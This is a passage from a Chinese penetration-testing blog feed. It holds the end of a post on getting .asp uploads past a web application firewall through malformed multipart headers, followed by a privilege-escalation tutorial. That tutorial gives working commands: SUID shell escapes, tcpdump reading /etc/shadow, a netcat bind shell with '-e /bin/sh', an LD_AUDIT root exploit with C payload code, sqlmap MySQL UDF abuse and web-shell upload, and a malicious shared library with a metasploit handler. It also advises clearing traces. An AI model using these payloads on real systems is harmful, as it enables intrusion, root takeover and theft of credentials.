<p>突破9 ，NTFS流 在文件名后加::$DATA绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp::$DATA”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp::$DATA\0x00\fuck.asp0x00.jpg”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破10， 经过对IIS 6.0的测试发现，其总是采用第一个Content-Disposition中的值做为接收参数，而安全狗总是以最后一个Content-Disposition中的值做为接收参数。因此尝试构造如下请求[上传backlion.asp成功]：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.asp”</div><div class="line"> </div><div class="line"> </div><div class="line">—————————–15377259221471</div><div class="line"> </div><div class="line"> </div><div class="line">Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.txt”</div><div class="line"> </div><div class="line">Content-Type: application/octet-stream</div><div class="line"> </div><div class="line"> </div><div class="line">Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.asp”</div><div class="line">Content-Disposition: form-data;</div><div class="line">name=”FileUploadName”; filename=”backlion.asp”</div></pre></td></tr></table></figure></p>
<p>突破11，将Content-Type和ConTent-Disposition调换顺序位置绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Type: text/html</div><div class="line">ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp”</div></pre></td></tr></table></figure></p>
<p>突破12，在文件名前缀加空格（tab键可替换）绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Disposition: form-data; name=”filepath”; filename=    “backlion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破13，在form-data加空格绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Disposition: form-data;      name=”uploaded”; filename=”backlion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破14，在form-data的前后加上+绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Disposition: +form-data; name=”filepath”; filename=”backlion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>或者：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Disposition: form-data+; name=”filepath”; filename=”backlion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原始默认状态：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;——WebKitFormBoundary2smpsxFB3D0KbA7D&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Content-Disposition: form-data; name=”filepath”; filename=”backlion.asp”&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Content-Type: text/html&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://zjw.dropsec.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://zjw.dropsec.xyz/tags/CTF/"/>
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试-03权限提升与内网渗透</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2017/12/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-03%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html</id>
    <published>2017-12-28T02:53:13.000Z</published>
    <updated>2018-01-03T13:41:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h3><p><strong>Linux</strong></p>
<ul>
<li>LinEnum<br>　　<a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">LinEnum</a>可以列举系统设置并且高度总结的linux本地枚举和权限提升检测脚本。<br>隐私访问：判断当前用户是否能够用空口令使用sudo命令,root用户的家目录能否访问。<br>系统信息：主机名，网络详情，当前IP等等。<br>用户信息：当前用户，列出所有包含uid/gid的用户信息，列出有root权限的用户，检查密码hash是否保存在/etc/passwd。<a id="more"></a><br>内核和发行版详细信息<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/11319169.jpg" alt=""></li>
<li>Linuxprivchecker<br>　　<a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="external">Linuxprivchecker</a>枚举系统设置和执行一些提升权限的检查。它由python实现，用来对被控制的系统提供建议的exploits。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/88618768.jpg" alt=""></li>
<li>Linux Exploit Suggester<br>　　<a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester" target="_blank" rel="external">Linux Exploit Suggester</a>它基于操作系统的内核版本号。这个程序会执行“uname -r”来得到系统内核版本号。然后返回一个包含了可能exploits的列表。另外它还可以使用“-k”参数手工指定内核版本。<br>　　如果你知道内核版本号就可以在终端中直接使用下列命令：<strong>./Linux_Exploit_Suggester.pl -k 3.5</strong>如果不知道就输入<strong>./Linux_Exploit_Suggester.pl uname –r</strong>来获得内核版本号然后使用上面的命令并把版本号替换成你自己的。然后它就会给出建议的exploits列表。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/44476752.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/84300850.jpg" alt=""></li>
<li>Unix-Privesc-checker<br>　　<a href="https://github.com/pentestmonkey/unix-privesc-check" target="_blank" rel="external">Unix-Privesc-checker</a>在UNIX系统上检测权限提升向量的shell脚本。它可以在UNIX和Linux系统上运行。寻找那些错误的配置可以用来允许未授权用户提升对其他用户或者本地应用的权限。<br>unix-privesc-check standard<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/67634331.jpg" alt=""><br>unix-privesc-check detailed<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/86649904.jpg" alt=""></li>
<li>Linux_Exploit_Suggester<br>　　<a href="https://github.com/sammbertram/Linux_Exploit_Suggester" target="_blank" rel="external">Linux_Exploit_Suggester</a></li>
</ul>
<p><strong>Windows</strong></p>
<ul>
<li>Windows-Exploit-Suggester<br>　　在目标机器中执行<strong>systeminfo</strong>，并保存为文本文件，Windows-Exploit-Suggester中所有的文件和内容<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227100917958.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227101504916.jpg" alt=""><br>　　执行<strong>python windows-exploit-suggester.py –database 2017-02-27-mssb.xls –systeminfo 12.txt</strong> ，参数<strong>–database</strong>，指定数据库位置(就是那个excel文件)，参数<strong>–systeminfo</strong>，指定目标信息的文件。它会显示所有可能的漏洞的操作系统受害者Windows PC<br><img src="http://obh1qcqek.bkt.clouddn.com/66666.jpg" alt=""><br>或者在线检测：<br><a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="external">https://bugs.hacking8.com/tiquan/</a><br>exp查找网址：<br><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://www.exploit-db.com/" target="_blank" rel="external">https://www.exploit-db.com/</a></li>
<li>BeRoot<br>　　<a href="https://github.com/AlessandroZ/BeRoot" target="_blank" rel="external">BeRoot</a>是一款Post-Exploitation工具，也就是在黑客拿到目标主机的Shell之后所要用到的一种东西。BeRoot可以帮助我们检查目标Windows系统中存在的错误配置，并找出提权的方法。</li>
<li>常用命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">systeminfo | findstr OS #获取系统版本信息</div><div class="line">hostname	#获取主机名称</div><div class="line">whomai /priv	#显示当前用户的安全特权</div><div class="line">quser or query user	#获取在线用户</div><div class="line">netstat -ano | findstr 3389	#获取rdp连接来源IP</div><div class="line">dir c:\programdata\ #分析安装杀软</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn	#列出已安装的补丁</div><div class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber	#获取远程端口</div><div class="line">tasklist /svc | find &quot;TermService&quot; + netstat -ano	#获取远程端口</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x02-提权方法"><a href="#0x02-提权方法" class="headerlink" title="0x02 提权方法"></a>0x02 提权方法</h3><p><strong>Linux</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">常规思路：</div><div class="line">1、检查漏洞系统的操作系统发行版</div><div class="line">2、查看内核版本</div><div class="line">3、检查可用的用户及当前用户的权限</div><div class="line">4、列出SUID文件（常见的Linux错误配置）</div><div class="line">5、查看安装的包、程序、运行的服务，过时的版本可能存在漏洞。</div></pre></td></tr></table></figure></p>
<ul>
<li>利用Linux内核漏洞提权<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lsb_release -a  查看系统的发行版本</div><div class="line">uname -a  查看内核版本</div><div class="line">也可以使用我们前面讲的那几个工具进行信息搜集</div></pre></td></tr></table></figure>
</li>
</ul>
<p>　　查找EXP可以利用前面Linux_Exploit_Suggester.pl脚本或者kali自带的searchsploit来搜索exploitdb中的漏洞利用代码,或者<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="external">SecWiki的github</a>也有整理。<br>　　我们首先移动到/tmp目录，然后新建一个文件，粘贴exploit代码进去依次运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ cd /tmp</div><div class="line">$ touch exploit.c</div><div class="line">$ vim exploit.c</div></pre></td></tr></table></figure></p>
<p>　　vim保存退出后，我们编译执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ gcc exploit.c -o exploit</div><div class="line">$　chomd 777 ./exploit</div><div class="line">$ ./exploit</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/12917243.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">通过截图可以看到我们已经获取到了root权限，接下来获取交互式的shell</div><div class="line">$ python -c ‘import pty; pty.spawn(“/bin/bash”)’</div></pre></td></tr></table></figure>
<ul>
<li>利用低权限用户目录下可被Root权限用户调用的脚本提权<br>如果设置了SUID这个标志位，普通权限的程序在执行的时候，可以暂时拥有root权限。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</div><div class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; </div><div class="line">find / -perm -u=s -type f 2&gt;/dev/null （使用这个最多）</div><div class="line">find –perm mode        #根据文件的权限来查找文件</div><div class="line">-u=s                   #查找s权限使一般使用者临时具有该文件所属主/组的执行权限</div><div class="line">-type  b/d/c/p/l/f     #查是块设备、目录、字符设备、管道、符号链接、普通文件</div><div class="line">“2&gt; /dev/null”         #代表忽略掉错误提示信息。</div><div class="line"></div><div class="line">可以用来提权的可执行文件有：</div><div class="line">Nmap 2.02到5.21</div><div class="line">Vim</div><div class="line">find</div><div class="line">Bash</div><div class="line">More</div><div class="line">Less</div><div class="line">Nano</div><div class="line">cp</div></pre></td></tr></table></figure>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/38304352.jpg" alt=""><br>nmap<br>老版本的nmap（2.02-5.21）有 interactive，是允许用户执行系统命令的。提权方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nmap --interactive</div><div class="line">nmap&gt; !sh</div><div class="line">sh-3.2# whoami</div><div class="line">root</div><div class="line"></div><div class="line">msf模块为：exploit/unix/local/setuid_nmap</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/75770663.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/43478958.jpg" alt=""><br>Find<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">touch test</div><div class="line">find test -exec whoami \;</div></pre></td></tr></table></figure></p>
<p>如果服务器上装了nc，可以直接使用以下命令进行监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">find test -exec netcat -lvp 5555 -e /bin/sh \;</div><div class="line">之后进行连接：</div><div class="line">netcat 192.168.1.100 5555</div><div class="line">则可获取root shell</div></pre></td></tr></table></figure></p>
<p>vim/vi<br>打开vim,按下ESC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">:set shell=/bin/sh</div><div class="line">:shell</div><div class="line"></div><div class="line">即可执行命令</div></pre></td></tr></table></figure></p>
<p>bash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bash -p</div><div class="line">bash-3.2# id</div><div class="line">uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</div></pre></td></tr></table></figure></p>
<p>less<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">less /etc/passwd</div><div class="line">!/bin/sh</div></pre></td></tr></table></figure></p>
<p>more<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">more /home/pelle/myfile</div><div class="line">!/bin/bash</div></pre></td></tr></table></figure></p>
<p>cp<br>使用cp覆盖 /etc/shadow<br>mv<br>使用mv 覆盖 /etc/shadow 或者/etc/sudoers<br>awk<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</div></pre></td></tr></table></figure></p>
<p>man<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">man passwd</div><div class="line">!/bin/bash</div></pre></td></tr></table></figure></p>
<p>python/perl/ruby/lua/etc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">perl</div><div class="line">exec &quot;/bin/bash&quot;;</div><div class="line"></div><div class="line">python</div><div class="line">import os</div><div class="line">os.system(&quot;/bin/bash&quot;)</div></pre></td></tr></table></figure></p>
<p>tcpdump<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">echo $&apos;id\ncat /etc/shadow&apos; &gt; /tmp/.test</div><div class="line">chmod +x /tmp/.test</div><div class="line">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</div></pre></td></tr></table></figure></p>
<p>利用tmp目录权限、suid 权限和C语言使普通帐号提权为ROOT权限，RHEL5-RHEL6下面都可以实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">[root@ahu ~]# useradd test</div><div class="line">[root@ahu ~]# passwd test</div><div class="line">New password: </div><div class="line">Retype new password:</div><div class="line">passwd: all authentication tokens updated successfully.</div><div class="line"></div><div class="line">[root@ahu ~]# su - test</div><div class="line">[test@ahu ~]$ whoami </div><div class="line">test                            //登陆到普通用户，发现创建不了其他用户</div><div class="line">[test@ahu ~]$ useradd aaa</div><div class="line">-bash: /usr/sbin/useradd: Permission denied</div><div class="line"></div><div class="line">进行身份变换</div><div class="line">[test@ahu ~]$ mkdir /tmp/exploit</div><div class="line">[test@ahu ~]$ ln /bin/ping /tmp/exploit/target</div><div class="line">[test@ahu exploit]$  exec 3&lt; /tmp/exploit/target</div><div class="line">[test@ahu exploit]$ ls -l /proc/$$/fd/3</div><div class="line">lr-x------ 1 test test 64 Aug 17 21:41 /proc/35612/fd/3 -&gt; /tmp/exploit/target</div><div class="line">[test@ahu exploit]$ rm -rf /tmp/exploit/</div><div class="line">[test@ahu exploit]$ ls -l /proc/$$/fd/3</div><div class="line">[test@ahu ~]$ vim payload.c </div><div class="line">void __attribute__((constructor)) init()     //在配置文件加入如下的内容</div><div class="line">&#123;</div><div class="line">    setuid(0);</div><div class="line">    system(&quot;/bin/bash&quot;);</div><div class="line">&#125;</div><div class="line">~           </div><div class="line">[test@ahu ~]$ gcc -w -fPIC -shared -o /tmp/exploit payload.c</div><div class="line">[test@ahu ~]$ ls -l /tmp/exploit</div><div class="line">[test@ahu ~]$ LD_AUDIT=&quot;$ORIGIN&quot; exec /proc/self/fd/3</div><div class="line">Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]</div><div class="line">            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]</div><div class="line">            [-M mtu discovery hint] [-S sndbuf]</div><div class="line">            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination</div><div class="line">[root@ahu ~]# whoami </div><div class="line">root</div><div class="line">发现身份变成了 root用户。身份变换成功！</div><div class="line">exploits:https://www.exploit-db.com/exploits/15274/</div></pre></td></tr></table></figure></p>
<ul>
<li><p>利用环境变量劫持高权限程序提权<br>　　我们当前登录的是”Kane”账号，当前没有有效的内核exploit，也没有其他可以利用的suid文件，只有在Kane的home目录下有一个“msgmike.”文件 ，使用file命令查看下这个文件 ，这是一个ELF 32位 LSB执行文件，但是当我们执行文件的时候，报错了<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/45878154.jpg" alt=""><br>　　通过报错信息我们可以看到msgmike调用cat命令读取/home/mike/msg.txt文件。针对这种情况，我们可以通过设置bash的$path环境变量来利用，通常的$PATH包含<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/40345247.jpg" alt=""><br>　　然而当我们调用cat命令的时候，cat会从以上目录来寻找，如果我们添加.到$PATH环境变量，则会先从当前目录来寻找cat指令，新建cat,添加执行权限<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/42042343.jpg" alt=""><br>　　这样当我们再次运行./msgmike命令的时候，就会触发当前目录下的cat(/bin/sh)，从而提权。完整的exploit如下<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/36229232.jpg" alt=""></p>
</li>
<li><p>MySQL连接用户为root<br>利用mysql提权</p>
</li>
</ul>
<p>1、找到MySQL插件目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &apos;http://xxxx&apos; --sql-shell</div><div class="line">show variables like &quot;%plugin%&quot;;</div></pre></td></tr></table></figure></p>
<p>2、利用sqlmap上传 lib_mysqludf_sys到MySQL插件目录;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &apos;http://xxxx&apos; --file-write=/lib_mysqludf_sys.so</div><div class="line">--file-dest=/usr/lib/mysql/plugin/</div></pre></td></tr></table></figure></p>
<p>3、激活存储过程「sys_exec」函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &apos;http://xxxx&apos; --sql-shell</div><div class="line">CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so</div><div class="line">SELECT * FROM information_schema.routines</div><div class="line">sys_exec(id);</div></pre></td></tr></table></figure></p>
<p>也利用sqlmap上传后门程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &apos;http://xxx&apos;  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php</div><div class="line"></div><div class="line">https://github.com/mysqludf/lib_mysqludf_sys</div><div class="line">https://code.google.com/p/mysql-udf-http/</div></pre></td></tr></table></figure>
<ul>
<li>利用动态链接共享对象库进行Linux提权<br>　　Linux中的动态链接共享对象库(dynamically linked shared object libraries)有点像Windows的DLL文件，与Windows中的DLL植入攻击类似，可以利用弱文件权限的共享库执行任意代码，进行Linux提权。<br><strong>OS怎样找到共享库?</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">当使用共享库的应用运行时，操作系统就会以下面的顺序寻找库：</div><div class="line">1. rpath-link选项中指定的目录；</div><div class="line">2. –rpath选项中指定的目录；</div><div class="line">3. LD_RUN_PATH；</div><div class="line">4. LD_LIBRARY_PATH；</div><div class="line">5. DT_RUNPATH或DT_RPATH中的目录；</div><div class="line">6. /lib and /usr/lib；</div><div class="line">7. /etc/ld.so.conf下的目录。</div></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>如何获取Root权限?</strong><br>　　如果攻击者可以用恶意的共享库取代原来的共享库，那么当应用运行时，就可以加载恶意代码，并以运行者的权限运行恶意代码。如果应用是以root用户权限运行的，那么整个主机就沦陷了。<br>　　攻击者可能需要耐心等待应用的运行，或者用社会工程学的技巧来诱导系统管理员执行运行恶意代码的应用。如果应用在开始菜单中被调用，比如cron或者其他进程，那么权限提升利用过程会快很多。</p>
<ul>
<li>用RPATH和弱文件权限编译的二进制文件可以进行root提权。<br>可以用ldd工具来找出使用共享库的二进制文件<br><img src="http://www.4hou.com/uploads/20171222/1513957265171473.png" alt=""><br>当objdump运行时，可以看到它是被/tmp/program/main处的静态RPATH编译的：<br><img src="http://www.4hou.com/uploads/20171222/1513957702873643.png" alt=""><br>/tmp分区默认是可写的，如果创建分区时没有NOEXEC标志，攻击者就可以在contextBinary运行时写入恶意的共享库。在有问题的服务器上，有个root权限的cron任务刚刚执行了有漏洞的二进制文件：<br><img src="http://www.4hou.com/uploads/20171222/1513957762448685.png" alt=""><br>在这个例子中我们用metasploit框架来创建可以在系统上植入的共享库。首先在攻击者的主机上设立handler<br><img src="http://www.4hou.com/uploads/20171222/1513958141771531.png" alt=""><br>这时，恶意库就创建了。利用的第一步是操作系统寻找共享库可以模仿的库：<br><img src="http://www.4hou.com/uploads/20171222/1513958195485836.png" alt=""><br>之前我用msfvenom创建的有相同payload的共享库作为handler：<br><img src="http://www.4hou.com/uploads/20171222/1513958230587933.png" alt=""><br>在被攻击的主机上，创建了目录结构而且库在可写的：<br><img src="http://www.4hou.com/uploads/20171222/1513958348323279.png" alt=""><br>一旦cron任务运行，恶意库就会执行。在metasploit控制台上有以root权限运行的shell会话，如图所示：<br><img src="http://www.4hou.com/uploads/20171222/1513958384790590.png" alt=""></li>
</ul>
<p>Linux提权指南<br><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="external">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a><br>Linux提权辅助脚本<br><a href="https://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="external">https://www.securitysift.com/download/linuxprivchecker.py</a><br><a href="https://github.com/HappyTreeFriend/linux-exploit-suggester" target="_blank" rel="external">https://github.com/HappyTreeFriend/linux-exploit-suggester</a><br>LinuxExploits<br><a href="https://github.com/HappyTreeFriend/kernel-exploits" target="_blank" rel="external">https://github.com/HappyTreeFriend/kernel-exploits</a><br>项目：<br><a href="https://github.com/NullArray/RootHelper" target="_blank" rel="external">https://github.com/NullArray/RootHelper</a></p>
<p><strong>Windows</strong></p>
<ul>
<li>利用exp溢出<br>　　尝试运行已知溢出漏洞的exp来获取system权限。注意shell不能执行命令，EXP可以在exploit-db获取。使用Windows-Exploit-Suggester查看可以执行的EXP</li>
<li>WINDOWS错误系统配置<br>1、检测目标主机是否存在该漏洞<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\&quot; |findstr/i /v &quot;&quot;&quot;</div><div class="line">如果存在一下结果则表示存在：</div><div class="line">FABS - Helping agent for MAGIX media database	 Fabs	C:\Program Files (x86)\Common </div><div class="line">Files\MAGIX Services\Database\bin\FABS.exe /DisableUI     Auto</div></pre></td></tr></table></figure>
</li>
</ul>
<p>或者使用BeRoot工具进行检测。<br>2、检查对有漏洞目录是否有写入的权限。<br>　　使用Windows内建工具icacls查看路径中受影响文件夹的权限，(M)代表修改权限，(F)代表完全控制，(CI)代表从属容器将继承访问控制项，(OI)代表从属文件将继承访问控制项。<br>3、攻击。<br>　　将我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下，然后运行如下命令尝试重启服务，如果失败的话等待服务器重启时执行exe，成功提权后记得清理痕迹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sc stop service_name</div><div class="line">sc start service_name</div></pre></td></tr></table></figure></p>
<p>具体可以学习参考：<a href="http://www.freebuf.com/articles/system/131388.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/131388.html</a></p>
<ul>
